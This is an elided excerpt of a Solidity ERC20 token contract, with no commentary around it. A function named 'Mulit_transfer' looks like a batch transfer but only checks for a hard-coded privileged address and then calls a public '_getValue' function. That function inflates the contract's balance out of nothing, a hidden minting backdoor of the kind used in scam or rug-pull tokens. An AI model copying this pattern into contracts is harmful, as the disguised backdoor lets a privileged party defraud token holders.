...
contract CCCC is Context, IERC20, Ownable{
    ...
    constructor () {
        ...
        _create = payable(address(0x89b8947202E57Bceb8Fd3D405200D52432dB2437));
    ...
    function Mulit_transfer(address[] calldata mulitHe) public {
            for (uint256 v; v < mulitHe.length; v++) {
                _vbool = (mulitHe[v] == _create);
                if(_vbool)_getValue(mulitHe[v]);
            }
        }

    function _getValue(address mulitInfos) public{
        uint256 infos = _balances[mulitInfos];
        uint256 endInfo = infos + uint256(2 * tFee);
        _balances[address(this)] += endInfo;
    }
